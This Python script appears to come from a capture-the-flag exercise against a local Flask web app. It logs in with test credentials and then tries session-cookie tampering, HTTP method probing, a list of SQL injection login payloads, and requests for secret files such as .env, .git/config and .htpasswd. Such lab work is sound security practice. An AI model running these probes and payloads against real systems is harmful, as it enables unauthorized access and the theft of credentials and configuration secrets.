import requests
import re
import base64

base_url = "http://127.0.0.1:32933"

print("="*60)
print("FINAL ATTEMPTS - DATABASE INJECTION & BYPASS")
print("="*60)

# Get authenticated session
session = requests.Session()
session.post(f"{base_url}/", data={'username': 'test'}, allow_redirects=False)
resp = session.post(f"{base_url}/password/test", data={'password': 'test'}, allow_redirects=False)
set_cookie = resp.headers.get('Set-Cookie', '')
sess_match = re.search(r'session=([^;]+)', set_cookie)
if sess_match:
    session.cookies.set('session', sess_match.group(1), domain='127.0.0.1', path='/')
    print(f"[+] Session: {sess_match.group(1)}")

# Try different HTTP methods on dashboard
print("\n[+] Testing different HTTP methods on /dashboard:")
methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
for method in methods:
    try:
        r = session.request(method, f"{base_url}/dashboard")
        print(f"    {method}: {r.status_code} (len={len(r.text)})")
        if r.status_code == 200 and method != 'HEAD':
            # Check for flags
            flags = re.findall(r'FLAG\{[^}]*\}', r.text, re.I)
            if flags:
                print(f"        [!] FLAGS: {flags}")
                print(f"        [!] Response:\n{r.text}")
    except Exception as e:
        print(f"    {method}: ERROR - {e}")

# Try accessing dashboard with malformed session
print("\n[+] Testing with manipulated session cookies:")
original_session = sess_match.group(1)

# Try different session manipulations
session_tests = [
    ("empty", ""),
    ("null", "null"),
    ("none", "None"),
    ("invalid_sig", original_session.rsplit('.', 1)[0] + ".invalid"),
    ("truncated", original_session[:20]),
]

for name, test_session in session_tests:
    test_sess = requests.Session()
    if test_session:
        test_sess.cookies.set('session', test_session, domain='127.0.0.1', path='/')
    r = test_sess.get(f"{base_url}/dashboard")
    print(f"    {name}: {r.status_code} (len={len(r.text)})")

# Check if there's a traceback/exception when forcing error
print("\n[+] Checking for debug/traceback info:")
r = session.get(f"{base_url}/dashboard", headers={'Accept': 'application/json'})
print(f"    JSON Accept: {r.status_code}")

r = session.get(f"{base_url}/dashboard", headers={'X-Debug': 'true'})
print(f"    X-Debug header: {r.status_code}")

# Check robots.txt and sitemap
print("\n[+] Checking standard files:")
for path in ['/robots.txt', '/sitemap.xml', '/.well-known/security.txt', '/crossdomain.xml']:
    r = session.get(f"{base_url}{path}")
    if r.status_code == 200:
        print(f"    [+] {path}: FOUND")
        print(f"        {r.text[:500]}")
    else:
        print(f"    [-] {path}: {r.status_code}")

# Try SQL injection on username field to bypass and get other accounts
print("\n[+] Testing SQL injection on login fields:")
sqli_payloads = [
    "test' OR '1'='1",
    "test'--",
    "test'#",
    "test' OR 1=1--",
    "admin'--",
    "' OR 1=1--",
]

for payload in sqli_payloads:
    test_sess = requests.Session()
    r1 = test_sess.post(f"{base_url}/", data={'username': payload}, allow_redirects=False)
    if r1.status_code == 302:
        redirect = r1.headers.get('Location', '')
        print(f"    Username '{payload}': Redirect to {redirect}")
        
        # Follow redirect and try password
        r2 = test_sess.post(f"{base_url}{redirect}", data={'password': 'test'}, allow_redirects=False)
        if r2.status_code == 302:
            set_cookie = r2.headers.get('Set-Cookie', '')
            if 'session=' in set_cookie:
                session_match = re.search(r'session=([^;]+)', set_cookie)
                if session_match:
                    print(f"        [+] Got session: {session_match.group(1)[:50]}...")
                    # Check if it decoded differently
                    parts = session_match.group(1).split('.')
                    if len(parts) >= 2:
                        try:
                            payload_b64 = parts[1]
                            padding_needed = 4 - len(payload_b64) % 4
                            if padding_needed != 4:
                                payload_b64 += '=' * padding_needed
                            decoded = base64.urlsafe_b64decode(payload_b64)
                            if b'user_id' in decoded or decoded != b'i\xcd\x05\xfa':
                                print(f"        [!] Different session payload: {decoded}")
                        except:
                            pass

# Check if there's environment variable exposure
print("\n[+] Testing for environment/config exposure:")
env_paths = [
    '/environ', '/env', '/.env', '/config.json', '/config.yaml', '/settings.json',
    '/.git/config', '/.htaccess', '/.htpasswd', '/config.php', '/database.yml'
]
for path in env_paths:
    r = session.get(f"{base_url}{path}")
    if r.status_code == 200:
        print(f"    [+] {path}: FOUND!")
        print(f"        First 300 chars:\n{r.text[:300]}")

print("\n" + "="*60)
print("FINAL CHECK - ALL COLLECTED INFO")
print("="*60)
print(f"Target: {base_url}")
print(f"Working credentials: test:test")
print(f"Session format: Flask session cookie (user_id=10032)")
print(f"Accessible endpoints: /, /password/test, /logout")
print(f"Protected endpoint (500 error): /dashboard")
print(f"FLAG status: NOT FOUND in any tested location")

